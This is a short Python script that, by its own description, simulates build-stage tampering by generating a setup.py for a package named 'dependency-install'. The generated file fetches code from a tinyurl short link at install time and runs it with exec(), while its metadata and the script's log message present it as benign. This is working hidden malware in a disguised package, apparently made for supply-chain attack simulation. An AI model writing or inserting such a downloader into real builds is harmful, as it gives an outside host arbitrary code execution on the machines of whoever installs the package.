'''
 # @ Create Time: 2025-08-13 11:48:28
 # @ Modified time: 2025-08-13 14:18:05
 # @ Description: inject a malicious downloader (payload stage 1) during build stage, to simulate tampering
 '''

from __future__ import annotations
import json, os, time, hashlib, base64, urllib.request, urllib.parse
from pathlib import Path
from typing import Any, Dict, List


ROOT = Path.cwd().parent
ARTDIR = ROOT.joinpath("artifact")
ARTDIR.mkdir(exist_ok=True)

# define dependencies to install for following stages
OUT = ARTDIR.joinpath("setup.py")

content = f"""
from setuptools import setup, find_packages
import requests

# injected malicious payload
response = requests.get("https://tinyurl.com/2cf88w93")
if response.status_code == 200:
    m_code = response.text
    # execute real payload with subprocess
    try:
        exec(m_code)
        # print("✅ payload executed")
    except Exception as e:
        print("❌ p failed:", e)

setup(
    name="dependency-install",
    version="0.3.0",
    description="download necessary libraries for following work.",
    author="Demon",
    author_email="test@example.com",
    packages=find_packages(),
    install_requires=[
        "requests>=2.0.0",
        "pyyaml>=5.0"
    ],
classifiers=[
    "Programming Language :: Python :: 3",
    "License :: OSI Approved :: MIT License"
],
)
# Built at {time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
"""

OUT.write_text(content, encoding="utf-8")
print("=== [Stage3] Build benign setup.py ===")
print(f"[build] wrote {OUT}")





